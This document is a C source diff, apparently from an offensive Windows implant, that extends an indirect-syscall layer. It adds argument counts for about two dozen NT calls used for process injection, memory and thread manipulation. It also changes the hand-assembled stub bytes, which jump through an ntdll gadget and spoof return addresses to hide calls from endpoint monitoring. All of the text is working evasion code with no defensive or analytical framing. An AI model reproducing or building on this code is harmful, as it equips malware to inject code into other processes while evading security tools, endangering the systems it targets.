@@ -32,8 +32,10 @@ typedef LONG NTSTATUS;
 typedef struct {
 	DWORD ssn;
 	BYTE * gadget; /* ntdll syscall;ret */
-	BYTE * stub;   /* VirtualAlloc'd 32B page; RW except while rewritten */
+	BYTE * stub;   /* VirtualAlloc'd page; RW except while rewritten */
 	BOOL  ready;
+	BYTE  arity;   /* NT parameter count: >4 means stack args, where the
+	                * v2 push would shift them under the kernel's nose */
 } sc_entry;
 
 /* the resolved syscall set (section 13.2): injection / memory / token /
@@ -41,33 +43,33 @@ typedef struct {
  * rest are resolved and queryable so later call sites route without new
  * resolution logic. */
 #define SC_LIST(X) \
-	X(write,    "NtWriteVirtualMemory") \
-	X(read,     "NtReadVirtualMemory") \
-	X(dup,      "NtDuplicateObject") \
-	X(alloc,    "NtAllocateVirtualMemory") \
-	X(protect,  "NtProtectVirtualMemory") \
-	X(free,     "NtFreeVirtualMemory") \
-	X(mapview,  "NtMapViewOfSection") \
-	X(unmap,    "NtUnmapViewOfSection") \
-	X(sect,     "NtCreateSection") \
-	X(openproc, "NtOpenProcess") \
-	X(openthrd, "NtOpenThread") \
-	X(qviproc,  "NtQueryInformationProcess") \
-	X(qvithrd,  "NtQueryInformationThread") \
-	X(qvmem,    "NtQueryVirtualMemory") \
-	X(wait1,    "NtWaitForSingleObject") \
-	X(waitex,   "NtWaitForSingleObjectEx") \
-	X(close,    "NtClose") \
-	X(cfile,    "NtCreateFile") \
-	X(rfile,    "NtReadFile") \
-	X(wfile,    "NtWriteFile") \
-	X(apc,      "NtQueueUserApc") \
-	X(getctx,   "NtGetContextThread") \
-	X(setctx,   "NtSetContextThread") \
-	X(resume,   "NtResumeThread") \
-	X(thrdex,   "NtCreateThreadEx")
+	X(write,    "NtWriteVirtualMemory", 5) \
+	X(read,     "NtReadVirtualMemory", 5) \
+	X(dup,      "NtDuplicateObject", 7) \
+	X(alloc,    "NtAllocateVirtualMemory", 6) \
+	X(protect,  "NtProtectVirtualMemory", 5) \
+	X(free,     "NtFreeVirtualMemory", 4) \
+	X(mapview,  "NtMapViewOfSection", 10) \
+	X(unmap,    "NtUnmapViewOfSection", 2) \
+	X(sect,     "NtCreateSection", 7) \
+	X(openproc, "NtOpenProcess", 3) \
+	X(openthrd, "NtOpenThread", 3) \
+	X(qviproc,  "NtQueryInformationProcess", 5) \
+	X(qvithrd,  "NtQueryInformationThread", 5) \
+	X(qvmem,    "NtQueryVirtualMemory", 6) \
+	X(wait1,    "NtWaitForSingleObject", 3) \
+	X(waitex,   "NtWaitForSingleObjectEx", 4) \
+	X(close,    "NtClose", 1) \
+	X(cfile,    "NtCreateFile", 11) \
+	X(rfile,    "NtReadFile", 9) \
+	X(wfile,    "NtWriteFile", 9) \
+	X(apc,      "NtQueueUserApc", 3) \
+	X(getctx,   "NtGetContextThread", 2) \
+	X(setctx,   "NtSetContextThread", 2) \
+	X(resume,   "NtResumeThread", 2) \
+	X(thrdex,   "NtCreateThreadEx", 11)
 
-#define SC_DECL(id, name) static sc_entry sc_##id;
+#define SC_DECL(id, name, ar) static sc_entry sc_##id;
 SC_LIST(SC_DECL)
 
 static BOOL sc_ready;
@@ -181,7 +183,18 @@ static void * make_exec(sc_entry * e, int indirect) {
 	p = e->stub;
 
 	memset(built, 0, sizeof(built));
-	if (indirect && e->gadget) {
+	if (indirect && e->gadget && e->arity > 4) {
+		/* stack-argument syscalls: the v2 push would shift [rsp+8..]
+		 * under the kernel's nose - fall back to the v1 plain indirect
+		 * jump (hides everything except the immediate stub frame).
+		 * Full RA spoof for these needs synthetic frames (13.2). */
+		built[0] = 0x4C; built[1] = 0x8B; built[2] = 0xD1;
+		built[3] = 0xB8;
+		memcpy(built + 4, &e->ssn, 4);
+		built[8] = 0xFF; built[9] = 0x25; /* jmp qword ptr [rip+0] */
+		memcpy(built + 14, &e->gadget, 8);
+	}
+	else if (indirect && e->gadget) {
 		/* v2 RA spoof:
 		 *   mov r10, rcx; mov eax, SSN
 		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
@@ -234,7 +247,7 @@ int syscalls_ssn_ntwrite(void) {
 
 int syscalls_gate_ready_count(void) {
 	int n = 0;
-#define SC_COUNT(id, name) n += sc_##id.ready ? 1 : 0;
+#define SC_COUNT(id, name, ar) n += sc_##id.ready ? 1 : 0;
 	SC_LIST(SC_COUNT)
 	return n;
 }
